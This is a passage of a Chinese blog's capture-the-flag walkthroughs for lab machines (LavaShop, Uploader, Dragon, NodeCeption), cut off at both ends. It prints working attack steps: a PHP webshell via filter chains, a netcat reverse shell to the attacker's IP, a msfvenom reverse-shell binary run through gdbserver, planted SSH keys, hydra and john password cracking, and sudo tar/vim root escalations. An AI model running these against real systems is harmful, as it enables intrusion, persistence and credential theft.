


然后应该想到这里打phpfilterchain

超级nb的一个项目https://github.com/synacktiv/php_filter_chain_generator

```bash
python php_filter_chain_generator.py --chain '<?php phpinfo();?> '
```

发现完全可行

<img src="/assets/img/thehackerslabs-notes/image-20251109143701186.png" alt="image-20251109143701186" style="zoom:50%;" />

那么接下来就是写一句话木马了

```bash
python php_filter_chain_generator.py --chain '<?php system($_POST["cmd"]);?> '
```

<img src="/assets/img/thehackerslabs-notes/image-20251109144243100.png" alt="image-20251109144243100" style="zoom:50%;" />

接下来记录下弹shell

### get shell

```bash
cmd=busybox nc 10.161.137.197 4444 -e bash
```

kali那边可以连接成功

<img src="/assets/img/thehackerslabs-notes/image-20251109150606753.png" alt="image-20251109150606753" style="zoom:50%;" />

接下来呢，学习一下维持shell

```bash
/usr/bin/script -qc /bin/bash /dev/null
^z
stty raw -echo;fg
reset
xterm
```

<img src="/assets/img/thehackerslabs-notes/image-20251109151315564.png" alt="image-20251109151315564" style="zoom: 80%;" />

简单说说这里干了些什么

1. `script -qc /bin/bash /dev/null`

- `script`：记录终端会话的工具
- `-qc /bin/bash`：安静模式执行bash
- `/dev/null`：输出到空设备（不保存记录）
- **效果**：创建一个伪终端(pty)，获得更好的交互支持

2. `^z` (Ctrl+Z)

- 把当前作业挂起到后台
- 暂停`script`进程

3. `stty raw -echo; fg`

- `stty raw`：设置终端为原始模式（直接传递按键）
- `-echo`：关闭回显（避免重复字符）
- `fg`：把挂起的作业拉回前台
- **效果**：恢复作业并设置正确的终端模式

4. `reset`

- 重置终端设置
- 修复可能混乱的显示

5. `xterm`

- 设置TERM环境变量为xterm
- 确保终端类型正确识别

![image-20251109151629813](/assets/img/thehackerslabs-notes/image-20251109151629813.png)

### to root

看到这里的进程里面，用户Rodri启动了个gdbserver服务，应该可以在这里上手

```bash
www-data@Thehackerslabs-LavaShop:/$ ps aux | grep Rodri
Rodri        406  0.0  0.1  11476  3496 ?        Ss   06:15   0:00 /usr/bin/gdbserver --once 0.0.0.0:1337 /bin/true
Rodri        428  0.0  0.0    404     4 ?        t    06:15   0:00 /bin/true
www-data    1030  100  0.0   3212   292 pts/0    R+   08:16   0:00 grep Rodri
www-data@Thehackerslabs-LavaShop:/$ 

```

参考链接：[来自hacktricks](https://book.hacktricks.wiki/zh/network-services-pentesting/pentesting-remote-gdbserver.html?highlight=gdbser#%E4%B8%8A%E4%BC%A0%E5%92%8C%E6%89%A7%E8%A1%8C)

我靠，这是真nb，kali端配置了nc -lvnp 4445

然后我本地先生成elf

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.161.137.197 LPORT=4445 PrependFork=true -f elf -o binary.elf
```

接下来就是pwndgbserver远程调试

```bash
(base) yolo@yolo:~/Desktop/tools$ gdb binary.elf
GNU gdb (Ubuntu 15.0.50.20240403-0ubuntu1) 15.0.50.20240403-git
Copyright (C) 2024 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 209 pwndbg commands. Type pwndbg [filter] for a list.
pwndbg: created 13 GDB functions (can be used with print/break). Type help function to see them.
Reading symbols from binary.elf...
(No debugging symbols found in binary.elf)
------- tip of the day (disable with set show-tips off) -------
Want to NOP some instructions? Use patch <address> 'nop; nop; nop'
pwndbg> target extended-remote 10.161.145.95:1337
Remote debugging using 10.161.145.95:1337
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
warning: File transfers from remote targets can be slow. Use "set sysroot" to access files locally instead.
Reading /lib64/ld-linux-x86-64.so.2 from remote target...
Reading symbols from target:/lib64/ld-linux-x86-64.so.2...
Reading /usr/lib/debug/.build-id/8a/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /lib64/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /lib64/.debug/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /usr/lib/debug//lib64/6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...
Reading /usr/lib/debug/lib64//6418ea8e57888dffe2d36c88b8c594201c25eb.debug from remote target...

This GDB supports auto-downloading debuginfo from the following URLs:
  <https://debuginfod.ubuntu.com>
Debuginfod has been disabled.
To make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.
(No debugging symbols found in target:/lib64/ld-linux-x86-64.so.2)
Reading /usr/lib/debug/.build-id/a7/52f6d1c0edab0671d291d55c36296a3c55f0c2.debug from remote target...
0x00007ffff7fe5a50 in ?? () from target:/lib64/ld-linux-x86-64.so.2
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────
 RAX  0
 RBX  0
 RCX  0
 RDX  0
 RDI  0
 RSI  0
 R8   0
 R9   0
 R10  0
 R11  0
 R12  0
 R13  0
 R14  0
 R15  0
 RBP  0
 RSP  0x7fffffffed00 ◂— 1
 RIP  0x7ffff7fe5a50 ◂— mov rdi, rsp
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
 ► 0x7ffff7fe5a50    mov    rdi, rsp     RDI => 0x7fffffffed00 ◂— 1
   0x7ffff7fe5a53    call   0x7ffff7fe6650              <0x7ffff7fe6650>

   0x7ffff7fe5a58    mov    r12, rax
   0x7ffff7fe5a5b    mov    rdx, qword ptr [rsp]
   0x7ffff7fe5a5f    mov    rsi, rdx
   0x7ffff7fe5a62    mov    r13, rsp
   0x7ffff7fe5a65    and    rsp, 0xfffffffffffffff0
   0x7ffff7fe5a69    mov    rdi, qword ptr [rip + 0x175b0]     RDI, [_rtld_global]
   0x7ffff7fe5a70    lea    rcx, [r13 + rdx*8 + 0x10]
   0x7ffff7fe5a75    lea    rdx, [r13 + 8]
   0x7ffff7fe5a79    xor    ebp, ebp                           EBP => 0
───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffed00 ◂— 1
01:0008│     0x7fffffffed08 —▸ 0x7fffffffeee3 ◂— '/bin/true'
02:0010│     0x7fffffffed10 ◂— 0
03:0018│     0x7fffffffed18 —▸ 0x7fffffffeeed ◂— 'SHELL=/bin/bash'
04:0020│     0x7fffffffed20 —▸ 0x7fffffffeefd ◂— 'PWD=/home/Rodri'
05:0028│     0x7fffffffed28 —▸ 0x7fffffffef0d ◂— 'LOGNAME=Rodri'
06:0030│     0x7fffffffed30 —▸ 0x7fffffffef1b ◂— 'SYSTEMD_EXEC_PID=1068'
07:0038│     0x7fffffffed38 —▸ 0x7fffffffef31 ◂— 'HOME=/home/Rodri'
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► 0   0x7ffff7fe5a50 None
   1              0x1 None
   2   0x7fffffffeee3 None
   3              0x0 None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> remote put binary.elf binary.elf
Successfully sent file "binary.elf".
pwndbg> set remote exec-file /home/Rodri/binary.elf
pwndbg> run
```

run了后，我们就在kali拿到用户Rodri的shell，接下来就像最上面那样维持下shell，不过这里有个新的路线，我们配置一个.ssh/authorized_keys，直接ssh远程连靶机，这样做的话，我们后续要是有文件上传等操作，直接scp上去就好了

> 温馨提示，这里生成ssh公钥的操作一定要在新的终端进行，不能直接退出pwndgb，否则Rodri的shell就维持失效了

```bash
# 攻击机
ssh-keygen -t rsa -b 4096 -f rodri_key
cat rodri_key.pub
# 靶机
mkdir -p /home/Rodri/.ssh
chmod 700 /home/Rodri/.ssh
echo "ssh-rsa...我们攻击机生成的rodri_key.pub" > /home/Rodri/.ssh/authorized_keys
chmod 600 /home/Rodri/.ssh/authorized_keys
chown -R Rodri:Rodri /home/Rodri/.ssh/
```

接下来退出pwndbg都没问题

```bash
(base) yolo@yolo:~/Desktop/tools$ ssh -i rodri_key Rodri@10.161.145.95
The authenticity of host '10.161.145.95 (10.161.145.95)' can't be established.
ED25519 key fingerprint is SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:31: [hashed name]
    ~/.ssh/known_hosts:36: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.161.145.95' (ED25519) to the list of known hosts.
Linux Thehackerslabs-LavaShop 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Rodri@Thehackerslabs-LavaShop:~$
```

然后提root的话，进行了常见的suid文件，cron*日志等等，没找到合适的，然后在env里面看到了ROOT_PASS

```bash
Rodri@Thehackerslabs-LavaShop:~$ env
SHELL=/bin/bash
ROOT_PASS=lalocadelaslamparas
......
Rodri@Thehackerslabs-LavaShop:~$ su root
Contraseña:
root@Thehackerslabs-LavaShop:/home/Rodri# ls
binary.elf  linpeas.sh  user.txt
root@Thehackerslabs-LavaShop:/home/Rodri# cd
root@Thehackerslabs-LavaShop:~# ls
root.txt
root@Thehackerslabs-LavaShop:~# cat root.txt
60493ecb4b8037433e58499?????????
root@Thehackerslabs-LavaShop:~#
```

## Uploader
> **提示:** 靶机跳转传送门
[Uploader](https://labs.thehackerslabs.com/machines/127)

<img src="/assets/img/thehackerslabs-notes/Uploader.png" alt="LavaShop" style="zoom:50%;" />


### 信息搜集

```bash
base) yolo@yolo:~$ nmap -sV -Pn 10.161.149.147
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-09 21:34 CST
Nmap scan report for 10.161.149.147
Host is up (0.76s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.35 seconds
(base) yolo@yolo:~$ dirsearch -u http://10.161.149.147/
/home/yolo/.pyenv/versions/3.13.1/lib/python3.13/site-packages/dirsearch/dirsearch.py:23: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3.post1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/yolo/reports/http_10.161.149.147/__25-11-09_21-42-42.txt

Target: http://10.161.149.147/

[21:42:42] Starting:
[21:42:43] 403 -  279B  - /.ht_wsr.txt
[21:42:43] 403 -  279B  - /.htaccess.orig
[21:42:43] 403 -  279B  - /.htaccess.bak1
[21:42:43] 403 -  279B  - /.htaccess_sc
[21:42:43] 403 -  279B  - /.htaccess.save
[21:42:43] 403 -  279B  - /.htaccess.sample
[21:42:43] 403 -  279B  - /.htaccessBAK
[21:42:43] 403 -  279B  - /.htaccessOLD
[21:42:43] 403 -  279B  - /.htaccess_orig
[21:42:43] 403 -  279B  - /.htaccessOLD2
[21:42:43] 403 -  279B  - /.htaccess_extra
[21:42:43] 403 -  279B  - /.html
[21:42:43] 403 -  279B  - /.htm
[21:42:43] 403 -  279B  - /.htpasswd_test
[21:42:43] 403 -  279B  - /.htpasswds
[21:42:43] 403 -  279B  - /.httr-oauth
[21:42:44] 403 -  279B  - /.php
[21:43:02] 403 -  279B  - /server-status/
[21:43:02] 403 -  279B  - /server-status
[21:43:05] 200 -    1KB - /upload.php
[21:43:06] 301 -  318B  - /uploads  ->  http://10.161.149.147/uploads/
[21:43:06] 200 -  513B  - /uploads/

Task Completed
(base) yolo@yolo:~$
```

### get shell

这道题真的ez，我随手上传了一个phpinfo，结果发现里面自带文件包含

<img src="/assets/img/thehackerslabs-notes/image-20251109214515335.png" alt="image-20251109214515335" style="zoom:50%;" />

那么直接写php一句话木马好了`<?php system($_GET['cmd']);?>`

<img src="/assets/img/thehackerslabs-notes/image-20251109215246972.png" alt="image-20251109215246972" style="zoom:50%;" />

接下来就弹下shell好了

<img src="/assets/img/thehackerslabs-notes/image-20251109215900785.png" alt="image-20251109215900785" style="zoom:50%;" />

接下来读取/home下的Readme.txt

![image-20251109220319495](/assets/img/thehackerslabs-notes/image-20251109220319495.png)

让我找到一个关键压缩包，那么就全局查找好了

```bash
www-data@TheHackersLabs-Operator:/srv/secret$ find / -name "*.zip" 2>/dev/null 
/srv/secret/File.zip
```

接下来开点小灶吧，我通过php一句话木马连接的shell，一般是通过python起个web服务，把文件下载下来，不过这里还有个方法，就是把文件复制给web的uploads下面，可以直接下载

```bash
www-data@TheHackersLabs-Operator:/srv/secret$ find / -name "*.zip" 2>/dev/null 
/srv/secret/File.zip
<rator:/srv/secret$ cp /srv/secret/File.zip /var/www/html/uploads/           
www-data@TheHackersLabs-Operator:/srv/secret$ cd /srv/secret/
www-data@TheHackersLabs-Operator:/srv/secret$ python3 -m http.server 7777
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
10.161.198.137 - - [09/Nov/2025 14:07:32] "GET /File.zip HTTP/1.1" 200 -
```

两个方法都在上面了

怎么能这样呢，这个压缩包被加密了的

```bash
(base) yolo@yolo:~$ zip2john File.zip > ziphash
ver 2.0 File.zip/Credentials/ is not encrypted, or stored with non-handled compression type
(base) yolo@yolo:~$ john ziphash --wordlist=/snap/seclists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size [KiB]) is 1 for all loaded hashes
Will run 32 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
121288           (File.zip/Credentials/Credentials.txt)
1g 0:00:00:00 DONE (2025-11-09 22:16) 3.704g/s 242725p/s 242725c/s 242725C/s 123456..ryanscott
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

真好，是个弱密码

解压拿到用户密码

```txt
User: operatorx
       
Password: d0970714757783e6cf17b26fb8e2298f
```

尝试好几次，登不上去，感觉是md5，解密下出来

>  怎么也是超级弱密码啊，我感觉能直接suForce爆破登录

<img src="/assets/img/thehackerslabs-notes/image-20251109221909027.png" alt="image-20251109221909027" style="zoom:50%;" />

### to root

```bash
operatorx@TheHackersLabs-Operator:~$ sudo -l
Matching Defaults entries for operatorx on TheHackersLabs-Operator:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User operatorx may run the following commands on TheHackersLabs-Operator:
    (ALL) NOPASSWD: /usr/bin/tar
operatorx@TheHackersLabs-Operator:~$ sudo /usr/bin/tar -h
/usr/bin/tar: You must specify one of the '-Acdtrux', '--delete' or '--test-label' options
Try '/usr/bin/tar --help' or '/usr/bin/tar --usage' for more information.
operatorx@TheHackersLabs-Operator:~$ sudo /usr/bin/tar --usage
Usage: tar [-AcdrtuxGnSkUWOmpsMBiajJzZhPlRvwo?] [-g FILE] [-C DIR] [-T FILE]
            [-X FILE] [-f ARCHIVE] [-F NAME] [-L NUMBER] [-b BLOCKS]
            [-H FORMAT] [-V TEXT] [-I PROG] [-K MEMBER-NAME] [-N DATE-OR-FILE]
            [--catenate] [--concatenate] [--create] [--delete] [--diff]
            [--compare] [--append] [--test-label] [--list] [--update]
            [--extract] [--get] [--check-device] [--listed-incremental=FILE]
            [--incremental] [--hole-detection=TYPE] [--ignore-failed-read]
            [--level=NUMBER] [--no-check-device] [--no-seek] [--seek]
            [--occurrence[=NUMBER]] [--sparse-version=MAJOR[.MINOR]] [--sparse]
            [--add-file=FILE] [--directory=DIR] [--exclude=PATTERN]
            [--exclude-backups] [--exclude-caches] [--exclude-caches-all]
            [--exclude-caches-under] [--exclude-ignore=FILE]
            [--exclude-ignore-recursive=FILE] [--exclude-tag=FILE]
            [--exclude-tag-all=FILE] [--exclude-tag-under=FILE] [--exclude-vcs]
            [--exclude-vcs-ignores] [--no-null] [--no-recursion] [--no-unquote]
            [--no-verbatim-files-from] [--null] [--recursion]
            [--files-from=FILE] [--unquote] [--verbatim-files-from]
            [--exclude-from=FILE] [--anchored] [--ignore-case] [--no-anchored]
            [--no-ignore-case] [--no-wildcards] [--no-wildcards-match-slash]
            [--wildcards] [--wildcards-match-slash] [--keep-directory-symlink]
            [--keep-newer-files] [--keep-old-files] [--no-overwrite-dir]
            [--one-top-level[=DIR]] [--overwrite] [--overwrite-dir]
            [--recursive-unlink] [--remove-files] [--skip-old-files]
            [--unlink-first] [--verify] [--ignore-command-error]
            [--no-ignore-command-error] [--to-stdout] [--to-command=COMMAND]
            [--atime-preserve[=METHOD]] [--clamp-mtime]
            [--delay-directory-restore] [--group=NAME] [--group-map=FILE]
            [--mode=CHANGES] [--mtime=DATE-OR-FILE] [--touch]
            [--no-delay-directory-restore] [--no-same-owner]
            [--no-same-permissions] [--numeric-owner] [--owner=NAME]
            [--owner-map=FILE] [--preserve-permissions] [--same-permissions]
            [--same-owner] [--sort=ORDER] [--preserve-order] [--same-order]
            [--acls] [--no-acls] [--no-selinux] [--no-xattrs] [--selinux]
            [--xattrs] [--xattrs-exclude=MASK] [--xattrs-include=MASK]
            [--force-local] [--file=ARCHIVE] [--info-script=NAME]
            [--new-volume-script=NAME] [--tape-length=NUMBER] [--multi-volume]
            [--rmt-command=COMMAND] [--rsh-command=COMMAND] [--volno-file=FILE]
            [--blocking-factor=BLOCKS] [--read-full-records] [--ignore-zeros]
            [--record-size=NUMBER] [--format=FORMAT] [--  gnu] [--  oldgnu] [--
             pax] [--  posix] [--  ustar] [--  v7] [--old-archive]
            [--portability]
            [--pax-option=keyword[[:]=value][,keyword[[:]=value]]...] [--posix]
            [--label=TEXT] [--auto-compress] [--use-compress-program=PROG]
            [--bzip2] [--xz] [--lzip] [--lzma] [--lzop] [--no-auto-compress]
            [--zstd] [--gzip] [--gunzip] [--ungzip] [--compress] [--uncompress]
            [--backup[=CONTROL]] [--hard-dereference] [--dereference]
            [--starting-file=MEMBER-NAME] [--newer-mtime=DATE]
            [--newer=DATE-OR-FILE] [--after-date=DATE-OR-FILE]
            [--one-file-system] [--absolute-names] [--suffix=STRING]
            [--strip-components=NUMBER] [--transform=EXPRESSION]
            [--xform=EXPRESSION] [--checkpoint[=NUMBER]]
            [--checkpoint-action=ACTION] [--full-time] [--index-file=FILE]
            [--check-links] [--no-quote-chars=STRING] [--quote-chars=STRING]
            [--quoting-style=STYLE] [--block-number] [--show-defaults]
            [--show-omitted-dirs] [--show-snapshot-field-ranges]
            [--show-transformed-names] [--show-stored-names]
            [--totals[=SIGNAL]] [--utc] [--verbose] [--warning=KEYWORD]
            [--interactive] [--confirmation] [--help] [--restrict] [--usage]
            [--version] [FILE]...

```

发现这里有个sudo无密码执行tar

直接来这里查https://gtfobins.github.io/gtfobins/tar/

成功拿到root的shell

```bash
sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

接下来使用`/usr/bin/script -qc /bin/bash /dev/null`将shell维持一下，然后就over了

<img src="/assets/img/thehackerslabs-notes/image-20251109223017224.png" alt="image-20251109223017224" style="zoom: 80%;" />

对了，我们解析下最后提权的payload

### payload各部分解析：

1. **`sudo`** - 以root权限执行命令
2. **`/usr/bin/tar`** - tar命令的完整路径
3. **`-cf /dev/null /dev/null`**
   - `-c` = 创建归档文件
   - `-f /dev/null` = 输出到/dev/null（空设备，丢弃输出）
   - `/dev/null` = 要归档的文件（实际上不需要真实文件）
4. **`--checkpoint=1`**
   - 设置检查点间隔为1个记录
   - 每处理1个文件就触发一次检查点
5. **`--checkpoint-action=exec=/bin/sh`**
   - **关键部分**：在检查点触发时执行 `/bin/sh`
   - 由于以root权限运行，所以启动的是root shell

## Dragon
> **提示:** 靶机跳转传送门
[Dragon](https://labs.thehackerslabs.com/machines/124)

<img src="/assets/img/thehackerslabs-notes/dragon.png" alt="Dragon" style="zoom:50%;" />
### 信息搜集

```bash
(base) yolo@yolo:~$ nmap -sV -Pn 10.161.159.35
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 18:21 CST
Nmap scan report for 10.161.159.35
Host is up (0.30s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.13 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.33 seconds
```

先关注下80的web端口

```bash
dirsearch -u http://10.161.159.35/
```

扫描了路径，拿到了secret/

<img src="/assets/img/thehackerslabs-notes/image-20251110183323325.png" alt="image-20251110183323325" style="zoom:50%;" />

```bash
(base) yolo@yolo:~$ curl -l http://10.161.159.35/secret/
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8" />
    <title>Secreto de Dragon Machine</title>
    <style>
        body {
            background-color: #222;
            color: #eee;
            font-family: 'Courier New', Courier, monospace;
            padding: 2em;
            text-align: center;
        }
        .riddle {
            background-color: #333;
            padding: 2em;
            border-radius: 12px;
            margin: 0 auto;
            max-width: 600px;
            box-shadow: 0 0 10px #f38ba8;
        }
    </style>
</head>
<body>
    <div class="riddle">
        <h1>Para Dragon:</h1>
        <p>“En la sombra de la cueva, un guardián vigila sin ver,<br>
        Su nombre es la clave, su fuerza, un misterio por resolver.<br>
        Intenta sin pausa, las llaves del dragón,<br>
        Y hallarás el secreto que abre la prisión.”</p>
    </div>
</body>
</html>
```

观察到这里有个`<h1>Para Dragon:</h1>`,感觉可以考虑dragon就是用户名了，然后打靶机中，如果拿到了用户名的话，很显然就和ssh远程连接有点关系了，有个猜想，这里应该是ssh弱密码爆破登录

### get shell

```bash
(base) yolo@yolo:~$ nano name.txt
(base) yolo@yolo:~$ cat name.txt
dragon
root
(base) yolo@yolo:~$ hydra -L name.txt -P /snap/seclists/rockyou.txt ssh://10.161.159.35 -V -I -e nsr
```

我这里假设root密码也是弱密码，看样子没跑出来，就跑出来了一个dragon用户的

<img src="/assets/img/thehackerslabs-notes/image-20251110183757773.png" alt="image-20251110183757773" style="zoom:50%;" />

直接连上，提权很ez

```bash
(base) yolo@yolo:~$ ssh dragon@10.161.159.35
The authenticity of host '10.161.159.35 (10.161.159.35)' can't be established.
ED25519 key fingerprint is SHA256:BffrSAW4tUB+TWrywXkSWeUxLcFSs0YSko5us+xdXQo.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.161.159.35' (ED25519) to the list of known hosts.
dragon@10.161.159.35's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-71-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of mar 05 ago 2025 08:13:17 UTC

  System load:  0.84               Processes:               105
  Usage of /:   40.7% of 11.21GB   Users logged in:         0
  Memory usage: 9%                 IPv4 address for enp0s3: 192.168.18.184
  Swap usage:   0%

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

El mantenimiento de seguridad expandido para Applications está desactivado

Se pueden aplicar 80 actualizaciones de forma inmediata.
Para ver estas actualizaciones adicionales, ejecute: apt list --upgradable

Active ESM Apps para recibir futuras actualizaciones de seguridad adicionales.
Vea https://ubuntu.com/esm o ejecute «sudo pro status»


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Tue Aug  5 08:13:55 2025 from 192.168.18.16
dragon@TheHackersLabs-Dragon:~$ ls -la
total 40
drwxr-x--- 5 dragon dragon 4096 ago  3 01:05 .
drwxr-xr-x 3 root   root   4096 jul 31 20:39 ..
-rw------- 1 dragon dragon 2943 ago  5 08:22 .bash_history
-rw-r--r-- 1 dragon dragon  220 mar 31  2024 .bash_logout
-rw-r--r-- 1 dragon dragon 3771 mar 31  2024 .bashrc
drwx------ 2 dragon dragon 4096 jul 31 20:44 .cache
drwxrwxr-x 3 dragon dragon 4096 jul 31 20:58 .local
-rw-r--r-- 1 dragon dragon  807 mar 31  2024 .profile
drwx------ 2 dragon dragon 4096 jul 31 20:40 .ssh
-rw-r--r-- 1 dragon dragon    0 ago  1 01:04 .sudo_as_admin_successful
-rw-r--r-- 1 root   root     33 ago  1 01:04 user.txt
dragon@TheHackersLabs-Dragon:~$ cat user.txt
e1f9c2e8a1d8477f9b3f6cd298??????
dragon@TheHackersLabs-Dragon:~$ sudo -l
Matching Defaults entries for dragon on TheHackersLabs-Dragon:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User dragon may run the following commands on TheHackersLabs-Dragon:
    (ALL) NOPASSWD: /usr/bin/vim
dragon@TheHackersLabs-Dragon:~$ sudo /usr/bin/vim -c ':!/bin/sh'

# id
uid=0(root) gid=0(root) groups=0(root)
# cd
# ls -la
total 44
drwx------  4 root root 4096 ago  5 08:22 .
drwxr-xr-x 23 root root 4096 jul 31 20:21 ..
-rw-------  1 root root 2592 ago  5 08:22 .bash_history
-rw-r--r--  1 root root 3106 abr 22  2024 .bashrc
-rw-r--r--  1 root root  560 ago  4 13:33 congrats.txt
-rw-------  1 root root   33 ago  1 01:17 .lesshst
drwxr-xr-x  3 root root 4096 jul 31 21:04 .local
-rw-r--r--  1 root root  161 abr 22  2024 .profile
-rw-------  1 root root   33 ago  1 01:10 root.txt
drwx------  2 root root 4096 jul 31 20:39 .ssh
-rw-------  1 root root  743 ago  5 08:22 .viminfo
# cat root.txt
7a4d1b35eebf4aefa5f1b0198b??????

```

### 解析提权payload

```bash
   -c <command>         Execute <command> after loading the first file
```

使用vim -h能看到这一条功能，意思是说加载一个文件后会立刻执行命令，然后我举个例子，这里就用上面生成的name.txt举例

<img src="/assets/img/thehackerslabs-notes/image-20251110185140318.png" alt="image-20251110185140318" style="zoom:50%;" />

输入`:!/bin/sh`会直接进入当前用户的shell

<img src="/assets/img/thehackerslabs-notes/image-20251110185041887.png" alt="image-20251110185041887" style="zoom:50%;" />

> ps:在vim中，要是想执行外部命令，**!**绝对不能丢
{: .prompt-warning }

然后呢，我的这个payload `sudo /usr/bin/vim -c ':!/bin/sh'`没有指定文件名也没问题，因为vim会默认打开一个空白的新文件

## NodeCeption
> **提示:** 靶机跳转传送门
[DodeCeption](https://labs.thehackerslabs.com/machines/118)

<img src="/assets/img/thehackerslabs-notes/NodeCeption.png" alt="NodeCeption" style="zoom:50%;" />

### 信息搜集

扫描完端口，发现三个存活端口

```bash
❯ nmap -sV -Pn -p 1-65535 10.161.159.139
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-11-10 20:32 CST
Nmap scan report for 10.161.159.139
Host is up (0.0017s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
5678/tcp open  rrac?
8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5678-TCP:V=7.94SVN%I=7%D=11/10%Time=6911DE73%P=x86_64-pc-linux-gnu%
SF:r(GetRequest,8DC,"HTTP/1\.1\x20200\x20OK\r\nAccept-Ranges:\x20bytes\r\n
SF:Cache-Control:\x20public,\x20max-age=86400\r\nLast-Modified:\x20Mon,\x2
SF:010\x20Nov\x202025\x2011:37:06\x20GMT\r\nETag:\x20W/\"7b7-19a6d8e3176\"
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:1975\r\nVary:\x20Accept-Encoding\r\nDate:\x20Mon,\x2010\x20Nov\x202025\
SF:x2012:45:37\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<
SF:html\x20lang=\"en\">\n\t<head>\n\t\t<script\x20type=\"module\"\x20cross
SF:origin\x20src=\"/assets/polyfills-B8p9DdqU\.js\"></script>\n\n\t\t<meta
SF:\x20charset=\"utf-8\"\x20/>\n\t\t<meta\x20http-equiv=\"X-UA-Compatible\
SF:"\x20content=\"IE=edge\"\x20/>\n\t\t<meta\x20name=\"viewport\"\x20conte
SF:nt=\"width=device-width,initial-scale=1\.0\"\x20/>\n\t\t<link\x20rel=\"
SF:icon\"\x20href=\"/favicon\.ico\"\x20/>\n\t\t<style>@media\x20\(prefers-
SF:color-scheme:\x20dark\)\x20{\x20body\x20{\x20background-color:\x20rgb\(
SF:45,\x2046,\x2046\)\x20}\x20}</style>\n\t\t<script\x20type=\"text/javasc
SF:ript\">\n\t\t\twindow\.BASE_PATH\x20=\x20'/';\n\t\t\twindow\.REST_ENDPO
